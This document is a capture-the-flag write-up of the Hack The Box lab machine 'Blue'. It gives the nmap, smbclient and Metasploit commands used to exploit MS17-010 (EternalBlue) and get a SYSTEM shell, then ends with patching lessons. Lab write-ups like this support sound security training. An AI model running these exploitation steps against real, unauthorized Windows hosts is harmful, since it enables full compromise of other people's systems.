# Hack The Box - Blue

## Machine Information

| Field            | Details                                                                 |
| ---------------- | ----------------------------------------------------------------------- |
| Platform         | Hack The Box                                                            |
| Machine          | Blue                                                                    |
| Difficulty       | Easy                                                                    |
| Operating System | Windows                                                                 |
| Category         | Windows Exploitation, SMB, Privilege Escalation                         |
| Main Skills      | SMB enumeration, EternalBlue exploitation, Windows privilege escalation |

---

# Overview

Blue is a Windows-based machine that demonstrates the impact of an unpatched SMB vulnerability.

The machine focuses on identifying vulnerable services and exploiting a known Windows kernel vulnerability.

The attack path includes:

* Network reconnaissance
* SMB enumeration
* Exploiting EternalBlue
* Obtaining a SYSTEM shell
* Retrieving flags

---

# Reconnaissance

The first step was identifying exposed services.

## Nmap Scan

```bash id="3v9s82"
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed:

```text
135/tcp  Microsoft RPC
139/tcp  NetBIOS
445/tcp  SMB
```

The SMB service was investigated further.

---

# SMB Enumeration

The SMB service was checked for available information.

```bash id="y0j4mh"
smbclient -L //<TARGET_IP>
```

The SMB version was identified:

```text
Microsoft Windows SMB
```

The service appeared vulnerable to a known SMB exploit.

---

# Vulnerability Discovery

The system was vulnerable to:

```text
MS17-010
```

Known as:

```text
EternalBlue
```

The vulnerability affects the SMBv1 protocol and allows remote code execution.

---

# Exploitation

The vulnerability was exploited using Metasploit.

Starting Metasploit:

```bash id="n8z7qw"
msfconsole
```

Searching for EternalBlue:

```bash id="t8m4qa"
search eternalblue
```

Loading the exploit:

```bash id="x2k5vp"
use exploit/windows/smb/ms17_010_eternalblue
```

Configuring the target:

```bash id="m7c9sd"
set RHOSTS <TARGET_IP>
```

Running the exploit:

```bash id="v4n6yx"
run
```

A Meterpreter session was obtained.

---

# System Enumeration

The current privileges were checked:

```bash id="q8j2mw"
getuid
```

Output:

```text
NT AUTHORITY\SYSTEM
```

The exploit provided full administrative privileges.

---

# Flag Retrieval

The user flag was located:

```text
C:\Users\<user>\Desktop\user.txt
```

The root/system flag was located:

```text
C:\Users\Administrator\Desktop\root.txt
```

---

# Tools Used

* Nmap
* SMBClient
* Metasploit
* Meterpreter

---

# Vulnerabilities Identified

## EternalBlue SMB Vulnerability

**Type:** Remote Code Execution

**CVE:** CVE-2017-0144

**Impact:**

An attacker can execute arbitrary code remotely and gain complete control over an affected Windows system.

---

# Lessons Learned

* SMB should not expose unnecessary services externally.
* Systems must be patched regularly.
* Vulnerability scanners can identify outdated services.
* Known vulnerabilities can lead to complete system compromise when left unpatched.
